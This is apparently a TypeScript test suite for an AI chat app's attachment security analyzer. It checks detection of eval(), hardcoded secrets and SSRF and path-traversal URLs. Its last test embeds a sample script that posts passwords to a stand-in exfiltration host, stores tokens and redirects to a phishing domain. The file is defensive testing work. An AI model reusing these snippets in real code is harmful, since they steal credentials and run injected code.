import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { SafetySecurityAnalyzer } from './analyzer';
import { Message, Attachment } from '@/lib/ai/types';
import { InputClassifier } from '@/lib/safety/analyzers/input-classifier';
import { CodeSecurityAnalyzer } from '@/lib/safety/analyzers/code-security-analyzer';
import { SafetyReport } from '@/lib/safety/types';
import {
  loadAttachmentContent,
  resolveSafeCloudinaryUrl,
  isTextAnalyzableAttachment,
  isPdfAttachment,
} from '@/lib/attachments/loader';

function createMockFetchResponse({
  status = 200,
  body = '',
  contentType = 'text/plain',
}: {
  status?: number;
  body?: string;
  contentType?: string;
}) {
  const bytes = Buffer.from(body, 'utf-8');
  return {
    ok: status >= 200 && status < 300,
    status,
    headers: {
      get: (header: string) => {
        const lower = header.toLowerCase();
        if (lower === 'content-type') return contentType;
        if (lower === 'content-length') return String(bytes.length);
        return null;
      },
    },
    body: {
      getReader: () => {
        let sent = false;
        return {
          read: async () => {
            if (sent) return { done: true, value: undefined };
            sent = true;
            return { done: false, value: new Uint8Array(bytes) };
          },
          cancel: async () => {},
        };
      },
    },
  };
}

describe('Security Checkup Attachment Analysis Pipeline', () => {
  const originalFetch = global.fetch;
  const originalCloudName = process.env.NEXT_PUBLIC_CLOUDINARY_CLOUD_NAME;
  const analyzer = new SafetySecurityAnalyzer();

  beforeEach(() => {
    process.env.NEXT_PUBLIC_CLOUDINARY_CLOUD_NAME = 'testcloud';
    vi.restoreAllMocks();
  });

  afterEach(() => {
    global.fetch = originalFetch;
    process.env.NEXT_PUBLIC_CLOUDINARY_CLOUD_NAME = originalCloudName;
  });

  // =========================================================================
  // A. Code attachment with eval()
  // =========================================================================
  it('A. Analyzes .js file containing eval() and reports high/critical risk with code findings', async () => {
    const maliciousJs = `
      function runInput(userInput) {
        return eval(userInput);
      }
    `;

    global.fetch = vi.fn().mockResolvedValue(
      createMockFetchResponse({
        body: maliciousJs,
        contentType: 'application/javascript',
      })
    );

    const history: Message[] = [
      {
        id: 'msg-1',
        conversation_id: 'conv-1',
        user_id: 'u1',
        role: 'user',
        content: 'Please inspect this script',
        created_at: new Date(),
        metadata: {
          attachments: [
            {
              id: 'att-1',
              type: 'file',
              url: 'https://res.cloudinary.com/testcloud/raw/upload/v1/my_ai_uploads/eval_test.js',
              public_id: 'my_ai_uploads/eval_test.js',
              original_name: 'eval_test.js',
              mime_type: 'application/javascript',
            },
          ],
        },
      },
    ];

    const context = await analyzer.analyze('Please inspect this script', history);
    const facts = context.facts as { report: SafetyReport };
    const report = facts.report;

    expect(report).toBeDefined();
    expect(report.inputType).toBe('code');
    expect(['high', 'critical']).toContain(report.riskLevel);
    expect(report.score).toBeGreaterThan(0);
    expect(report.findings.length).toBeGreaterThan(0);

    const evalFinding = report.findings.find(f => f.type === 'dangerous_function');
    expect(evalFinding).toBeDefined();
    expect(evalFinding?.title).toContain('eval()');
  });

  // =========================================================================
  // B. Secret detection in code attachment
  // =========================================================================
  it('B. Detects hardcoded test secrets in uploaded code attachment', async () => {
    const codeWithSecret = `
      const apiKey = "ghp_123456789012345678901234567890123456";
      const config = { secret: "abcdef1234567890abcdef" };
    `;

    global.fetch = vi.fn().mockResolvedValue(
      createMockFetchResponse({
        body: codeWithSecret,
        contentType: 'application/javascript',
      })
    );

    const history: Message[] = [
      {
        id: 'msg-1',
        conversation_id: 'conv-1',
        user_id: 'u1',
        role: 'user',
        content: '',
        created_at: new Date(),
        metadata: {
          attachments: [
            {
              id: 'att-secret',
              type: 'file',
              url: 'https://res.cloudinary.com/testcloud/raw/upload/v1/my_ai_uploads/secrets.js',
              public_id: 'my_ai_uploads/secrets.js',
              original_name: 'secrets.js',
              mime_type: 'application/javascript',
            },
          ],
        },
      },
    ];

    const context = await analyzer.analyze('', history);
    const facts = context.facts as { report: SafetyReport };
    const report = facts.report;

    expect(report.riskLevel).toBe('critical');
    expect(report.score).toBeGreaterThanOrEqual(35);
    const secretFinding = report.findings.find(f => f.type === 'exposed_secret');
    expect(secretFinding).toBeDefined();
    expect(secretFinding?.title).toContain('Secret');
  });

  // =========================================================================
  // C. Benign code attachment
  // =========================================================================
  it('C. Benign code file produces low risk and 0 critical findings', async () => {
    const benignJs = 'console.log("hello");\nconst x = 1 + 2;\n';

    global.fetch = vi.fn().mockResolvedValue(
      createMockFetchResponse({
        body: benignJs,
        contentType: 'application/javascript',
      })
    );

    const history: Message[] = [
      {
        id: 'msg-1',
        conversation_id: 'conv-1',
        user_id: 'u1',
        role: 'user',
        content: 'Check benign code',
        created_at: new Date(),
        metadata: {
          attachments: [
            {
              id: 'att-benign',
              type: 'file',
              url: 'https://res.cloudinary.com/testcloud/raw/upload/v1/my_ai_uploads/clean.js',
              public_id: 'my_ai_uploads/clean.js',
              original_name: 'clean.js',
              mime_type: 'application/javascript',
            },
          ],
        },
      },
    ];

    const context = await analyzer.analyze('Check benign code', history);
    const facts = context.facts as { report: SafetyReport };
    const report = facts.report;

    expect(report.riskLevel).toBe('low');
    expect(report.score).toBe(0);
    expect(report.findings.length).toBe(0);
    expect(report.summary).toContain('no immediate suspicious signals');
  });

  // =========================================================================
  // D. MIME classification: text/javascript -> code
  // =========================================================================
  it('D. Classifies input with text/javascript MIME type as code', () => {
    const classification = InputClassifier.classify({
      rawContent: 'var a = 1;',
      mimeType: 'text/javascript',
      filename: 'unknown_file',
    });
    expect(classification).toBe('code');
  });

  // =========================================================================
  // E. Filename classification: exploit.js -> code
  // =========================================================================
  it('E. Classifies input with exploit.js filename as code', () => {
    const classification = InputClassifier.classify({
      rawContent: 'test data',
      filename: 'exploit.js',
    });
    expect(classification).toBe('code');
  });

  // =========================================================================
  // F. TXT attachment containing suspicious code
  // =========================================================================
  it('F. Analyzes suspicious code inside a .txt attachment', async () => {
    const codeInTxt = 'const evil = Function("return process.env")();';

    global.fetch = vi.fn().mockResolvedValue(
      createMockFetchResponse({
        body: codeInTxt,
        contentType: 'text/plain',
      })
    );

    const history: Message[] = [
      {
        id: 'msg-1',
        conversation_id: 'conv-1',
        user_id: 'u1',
        role: 'user',
        content: 'Look at notes.txt',
        created_at: new Date(),
        metadata: {
          attachments: [
            {
              id: 'att-txt',
              type: 'text',
              url: 'https://res.cloudinary.com/testcloud/raw/upload/v1/my_ai_uploads/notes.txt',
              public_id: 'my_ai_uploads/notes.txt',
              original_name: 'notes.txt',
              mime_type: 'text/plain',
            },
          ],
        },
      },
    ];

    const context = await analyzer.analyze('Look at notes.txt', history);
    const facts = context.facts as { report: SafetyReport };
    const report = facts.report;

    expect(report.findings.some(f => f.type === 'dangerous_function')).toBe(true);
    expect(['high', 'critical']).toContain(report.riskLevel);
  });

  // =========================================================================
  // G. HTML attachment: sanitized content analyzed, scripts never executed
  // =========================================================================
  it('G. Sanitizes HTML attachments and never executes embedded scripts', async () => {
    const rawHtml = '<html><body><h1>Account Login</h1><script>alert("evil")</script><p>Verify password</p></body></html>';

    global.fetch = vi.fn().mockResolvedValue(
      createMockFetchResponse({
        body: rawHtml,
        contentType: 'text/html',
      })
    );

    const history: Message[] = [
      {
        id: 'msg-1',
        conversation_id: 'conv-1',
        user_id: 'u1',
        role: 'user',
        content: 'Check page.html',
        created_at: new Date(),
        metadata: {
          attachments: [
            {
              id: 'att-html',
              type: 'html',
              url: 'https://res.cloudinary.com/testcloud/raw/upload/v1/my_ai_uploads/page.html',
              public_id: 'my_ai_uploads/page.html',
              original_name: 'page.html',
              mime_type: 'text/html',
            },
          ],
        },
      },
    ];

    const context = await analyzer.analyze('Check page.html', history);
    const facts = context.facts as { report: SafetyReport };
    const report = facts.report;

    expect(report).toBeDefined();
    // HTML is processed passively as text, scripts stripped
    expect(report.status).toBe('completed');
  });

  // =========================================================================
  // H. Attachment fetch failure: analysis-not-available state, never false safe
  // =========================================================================
  it('H. Handles attachment fetch failure without producing a false safe result', async () => {
    global.fetch = vi.fn().mockResolvedValue(
      createMockFetchResponse({
        status: 404,
        body: 'Not Found',
      })
    );

    const history: Message[] = [
      {
        id: 'msg-1',
        conversation_id: 'conv-1',
        user_id: 'u1',
        role: 'user',
        content: '',
        created_at: new Date(),
        metadata: {
          attachments: [
            {
              id: 'att-fail',
              type: 'file',
              url: 'https://res.cloudinary.com/testcloud/raw/upload/v1/my_ai_uploads/missing.js',
              public_id: 'my_ai_uploads/missing.js',
              original_name: 'missing.js',
              mime_type: 'application/javascript',
            },
          ],
        },
      },
    ];

    const context = await analyzer.analyze('', history);
    const facts = context.facts as { report: SafetyReport };
    const report = facts.report;

    expect(report.riskLevel).toBe('unknown');
    expect(report.status).toBe('failed');
    expect(report.confidenceLevel).toBe('low');
    expect(report.summary).toContain('could not be retrieved for inspection');
    expect(report.recommendations.some(r => r.action === 'proceed_with_caution')).toBe(true);
  });

  // =========================================================================
  // I. Multiple attachments: analyze up to 3 and combine findings
  // =========================================================================
  it('I. Analyzes up to 3 multiple attachments and combines findings correctly', async () => {
    global.fetch = vi.fn().mockImplementation((url: string) => {
      if (url.includes('file1.js')) {
        return Promise.resolve(
          createMockFetchResponse({
            body: 'eval(data);',
            contentType: 'application/javascript',
          })
        );
      }
      if (url.includes('file2.js')) {
        return Promise.resolve(
          createMockFetchResponse({
            body: 'const secret = "ghp_123456789012345678901234567890123456";',
            contentType: 'application/javascript',
          })
        );
      }
      return Promise.resolve(
        createMockFetchResponse({
          body: 'console.log("clean");',
          contentType: 'application/javascript',
        })
      );
    });

    const history: Message[] = [
      {
        id: 'msg-1',
        conversation_id: 'conv-1',
        user_id: 'u1',
        role: 'user',
        content: 'Compare files',
        created_at: new Date(),
        metadata: {
          attachments: [
            {
              id: 'att-1',
              type: 'file',
              url: 'https://res.cloudinary.com/testcloud/raw/upload/v1/my_ai_uploads/file1.js',
              public_id: 'my_ai_uploads/file1.js',
              original_name: 'file1.js',
              mime_type: 'application/javascript',
            },
            {
              id: 'att-2',
              type: 'file',
              url: 'https://res.cloudinary.com/testcloud/raw/upload/v1/my_ai_uploads/file2.js',
              public_id: 'my_ai_uploads/file2.js',
              original_name: 'file2.js',
              mime_type: 'application/javascript',
            },
            {
              id: 'att-3',
              type: 'file',
              url: 'https://res.cloudinary.com/testcloud/raw/upload/v1/my_ai_uploads/file3.js',
              public_id: 'my_ai_uploads/file3.js',
              original_name: 'file3.js',
              mime_type: 'application/javascript',
            },
          ],
        },
      },
    ];

    const context = await analyzer.analyze('Compare files', history);
    const facts = context.facts as { report: SafetyReport };
    const report = facts.report;

    expect(report.findings.length).toBeGreaterThanOrEqual(2);
    expect(report.findings.some(f => f.type === 'dangerous_function')).toBe(true);
    expect(report.findings.some(f => f.type === 'exposed_secret')).toBe(true);
    expect(report.riskLevel).toBe('critical');
  });

  // =========================================================================
  // J. No attachment: baseline behavior preserved
  // =========================================================================
  it('J. Preserves existing prompt-only Security Checkup behavior when no attachment exists', async () => {
    const history: Message[] = [
      {
        id: 'msg-1',
        conversation_id: 'conv-1',
        user_id: 'u1',
        role: 'user',
        content: 'Is https://google.com safe?',
        created_at: new Date(),
      },
    ];

    const context = await analyzer.analyze('Is https://google.com safe?', history);
    const facts = context.facts as { report: SafetyReport };
    const report = facts.report;

    expect(report).toBeDefined();
    expect(report.riskLevel).toBe('low');
    expect(report.status).toBe('completed');
  });

  // =========================================================================
  // K. PDF regression: identifies PDF safely without crash or unsafe execution
  // =========================================================================
  it('K. Handles PDF attachment safely without running unsafe parser or crashing', async () => {
    const history: Message[] = [
      {
        id: 'msg-1',
        conversation_id: 'conv-1',
        user_id: 'u1',
        role: 'user',
        content: 'Review this PDF',
        created_at: new Date(),
        metadata: {
          attachments: [
            {
              id: 'att-pdf',
              type: 'pdf',
              url: 'https://res.cloudinary.com/testcloud/raw/upload/v1/my_ai_uploads/documents/doc.pdf',
              public_id: 'my_ai_uploads/documents/doc.pdf',
              original_name: 'doc.pdf',
              mime_type: 'application/pdf',
            },
          ],
        },
      },
    ];

    const context = await analyzer.analyze('Review this PDF', history);
    const facts = context.facts as { report: SafetyReport };
    const report = facts.report;

    expect(report.inputType).toBe('document');
    expect(report.summary).toContain('Attached PDF document');
    expect(report.limitations.some(l => l.includes('PDF content inspection'))).toBe(true);
  });

  // =========================================================================
  // L. SSRF regression in loader
  // =========================================================================
  describe('L. SSRF & URL Validation in attachment loader', () => {
    it('rejects non-https protocol', () => {
      const att: Attachment = {
        type: 'file',
        url: 'http://res.cloudinary.com/testcloud/raw/upload/v1/my_ai_uploads/test.js',
      };
      expect(() => resolveSafeCloudinaryUrl(att, 'testcloud')).toThrow(/Invalid host/i);
    });

    it('rejects foreign hostname', () => {
      const att: Attachment = {
        type: 'file',
        url: 'https://evil-server.com/testcloud/raw/upload/v1/my_ai_uploads/test.js',
      };
      expect(() => resolveSafeCloudinaryUrl(att, 'testcloud')).toThrow(/Invalid host/i);
    });

    it('rejects wrong Cloudinary cloud name', () => {
      const att: Attachment = {
        type: 'file',
        url: 'https://res.cloudinary.com/othercloud/raw/upload/v1/my_ai_uploads/test.js',
      };
      expect(() => resolveSafeCloudinaryUrl(att, 'testcloud')).toThrow(/Invalid path/i);
    });

    it('rejects path traversal in public_id', () => {
      const att: Attachment = {
        type: 'file',
        url: 'https://res.cloudinary.com/testcloud/raw/upload/v1/my_ai_uploads/../secret.js',
        public_id: 'my_ai_uploads/../secret.js',
      };
      expect(() => resolveSafeCloudinaryUrl(att, 'testcloud')).toThrow(/Invalid characters/i);
    });

    it('rejects consecutive slashes in public_id', () => {
      const att: Attachment = {
        type: 'file',
        url: 'https://res.cloudinary.com/testcloud/raw/upload/v1/my_ai_uploads//secret.js',
        public_id: 'my_ai_uploads//secret.js',
      };
      expect(() => resolveSafeCloudinaryUrl(att, 'testcloud')).toThrow(/Invalid characters/i);
    });

    it('rejects unauthorized upload namespace', () => {
      const att: Attachment = {
        type: 'file',
        url: 'https://res.cloudinary.com/testcloud/raw/upload/v1/unauthorized_folder/test.js',
        public_id: 'unauthorized_folder/test.js',
      };
      expect(() => resolveSafeCloudinaryUrl(att, 'testcloud')).toThrow(/Invalid upload namespace/i);
    });
  });

  // =========================================================================
  // Production Test File Pattern Verification
  // =========================================================================
  it('Flags all suspicious patterns from the production test scenario', async () => {
    const prodTestCase = `
      // Harmless security simulation
      const token = "AKIA1234567890ABCDEF";
      localStorage.setItem("auth_token", token);
      const bearer = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abcdef";
      
      function sendCreds(password) {
        fetch("https://exfil.example.com/steal", {
          method: "POST",
          body: JSON.stringify({ password: password })
        });
      }

      function executeDynamic(userInput) {
        eval(userInput);
      }

      window.location.href = "https://phishing.example.com";
    `;

    global.fetch = vi.fn().mockResolvedValue(
      createMockFetchResponse({
        body: prodTestCase,
        contentType: 'application/javascript',
      })
    );

    const history: Message[] = [
      {
        id: 'msg-1',
        conversation_id: 'conv-1',
        user_id: 'u1',
        role: 'user',
        content: 'Check this JavaScript code for vulnerabilities',
        created_at: new Date(),
        metadata: {
          attachments: [
            {
              id: 'att-prod',
              type: 'file',
              url: 'https://res.cloudinary.com/testcloud/raw/upload/v1/my_ai_uploads/security_test.js',
              public_id: 'my_ai_uploads/security_test.js',
              original_name: 'security_test.js',
              mime_type: 'application/javascript',
            },
          ],
        },
      },
    ];

    const context = await analyzer.analyze('Check this JavaScript code for vulnerabilities', history);
    const facts = context.facts as { report: SafetyReport };
    const report = facts.report;

    expect(report.inputType).toBe('code');
    expect(report.riskLevel).toBe('critical');
    expect(report.score).toBeGreaterThanOrEqual(55);
    expect(report.findings.length).toBeGreaterThanOrEqual(3);

    const titles = report.findings.map(f => f.title);
    expect(titles.some(t => t.includes('Secret'))).toBe(true);
    expect(titles.some(t => t.includes('eval()'))).toBe(true);
    expect(titles.some(t => t.includes('Exfiltration') || t.includes('Storage') || t.includes('Redirect'))).toBe(true);
  });
});
